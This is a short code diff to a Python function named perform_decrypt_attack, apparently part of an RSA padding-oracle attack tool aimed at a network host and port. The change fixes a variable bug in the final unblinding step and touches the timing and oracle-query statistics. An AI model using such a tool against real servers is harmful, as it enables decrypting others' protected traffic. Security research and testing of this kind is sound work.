@@ -474,13 +474,14 @@ def perform_decrypt_attack(host_name, server_port, ciphertext, s_quiet=True, s_c
   print("C:      ", hex(C))
   print("result: ", hex(a))
 
+
   if s0 != 1:
       x = int(gmpy2.invert(s0, N))
-      res = (x * a) % N
-      print("result after unblinding: ", hex(res))
+      a = (x * a) % N
+      print("result after unblinding: ", hex(a))
 
   stoptime = time.time()
   print("Time elapsed:", stoptime - starttime, "seconds (=", (stoptime - starttime) / 60, "minutes)")
   print("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About", (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
   print(count, "oracle queries performed,", countvalid, "valid ciphertexts.")
-  return res
+  return a
